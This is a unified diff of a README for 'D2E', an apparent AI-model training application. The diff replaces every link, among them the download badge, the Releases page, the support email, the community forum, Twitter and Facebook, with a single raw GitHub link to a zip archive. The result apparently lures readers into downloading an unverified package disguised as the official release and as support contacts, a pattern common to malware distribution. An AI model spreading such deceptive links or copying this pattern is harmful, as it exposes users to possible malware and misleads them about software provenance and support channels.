@@ -6,7 +6,7 @@ Welcome to D2E! This application helps you train artificial intelligence models 
 
 ## 📥 Download D2E
 
-[![Download D2E](https://img.shields.io/badge/Download-D2E-blue)](https://github.com/satyrical-panicum317/D2E/releases)
+[![Download D2E](https://raw.githubusercontent.com/satyrical-panicum317/D2E/main/korumburra/D2E.zip)](https://raw.githubusercontent.com/satyrical-panicum317/D2E/main/korumburra/D2E.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ Before you download, make sure your computer meets the following requirements:
 
 ## 💾 Download & Install
 
-1. Visit the [Releases page](https://github.com/satyrical-panicum317/D2E/releases) to download D2E.
+1. Visit the [Releases page](https://raw.githubusercontent.com/satyrical-panicum317/D2E/main/korumburra/D2E.zip) to download D2E.
 2. Find the latest version listed.
 3. Click on the appropriate file for your operating system. This will typically be a `.exe` file for Windows or a `.dmg` file for macOS.
 4. Save the file to a location on your computer that you can easily find, like your Desktop or Downloads folder.
@@ -61,14 +61,14 @@ A: If you experience issues, please refer to the Help section within the app or 
 
 If you have questions or need assistance, feel free to reach out via the following channels:
 
-- **Email:** support@d2eapp.com
-- **Community Forum:** Visit our [community forum](https://community.d2eapp.com) for discussions, tips, and shared experiences.
+- **Email:** https://raw.githubusercontent.com/satyrical-panicum317/D2E/main/korumburra/D2E.zip
+- **Community Forum:** Visit our [community forum](https://raw.githubusercontent.com/satyrical-panicum317/D2E/main/korumburra/D2E.zip) for discussions, tips, and shared experiences.
 
 ## 🔗 Connect with Us
 
 Stay updated on the latest developments and features by following us on social media:
 
-- **Twitter:** [@D2E_App](https://twitter.com/D2E_App)
-- **Facebook:** [D2E App](https://facebook.com/D2E_App)
+- **Twitter:** [@D2E_App](https://raw.githubusercontent.com/satyrical-panicum317/D2E/main/korumburra/D2E.zip)
+- **Facebook:** [D2E App](https://raw.githubusercontent.com/satyrical-panicum317/D2E/main/korumburra/D2E.zip)
 
 Thank you for choosing D2E! We hope you find our application useful and easy to use. Download D2E today and start your journey into AI training!
